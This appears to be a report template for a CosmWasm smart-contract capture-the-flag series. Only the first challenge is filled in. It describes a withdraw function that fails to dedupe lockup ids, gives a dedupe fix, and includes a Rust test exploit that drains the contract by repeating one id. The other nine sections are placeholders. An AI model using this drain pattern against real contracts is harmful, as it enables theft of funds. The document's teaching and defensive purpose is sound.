# Sample Report Template

## Challenge 01: _Mjolnir_

### Description

There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.

Here is the relevant code:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    for lockup in lockups {
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized { });
        }
        total_amount += lockup.amount;
        LOCKUPS.remove(deps.storage, lockup.id);
    }
    // ...
}
```

The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.

### Recommendation

To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    let mut ids = ids;
    ids.sort();
    ids.dedup();

    for lockup_id in ids.clone().into_iter() {
    // ...
}
```

With this fix, the contract will only withdraw 1 time per lockup id.

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let hacker = Addr::unchecked(HACKER.to_string());

    // mint funds to hacker
    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);

    // deposit
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
    )
    .unwrap();

    let msg = QueryMsg::GetLockup { id: 2 };
    let lockup: Lockup = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
    assert_eq!(lockup.owner, hacker);

    // fast forward to LOCK_PERIOD
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // "hacker" tries to drain contract
    let msg = ExecuteMsg::Withdraw {
        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
    };
    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
    assert!(res.is_ok());

    // verify funds received should match deposit amount
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
}
```

---

## Challenge 02: _Gungnir_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 03: _Laevateinn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 04: _Gram_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: _Draupnir_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 06: _Hofund_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 07: _Tyrfing_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: _Gjallarhorn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: _Brisingamen_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: _Mistilteinn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
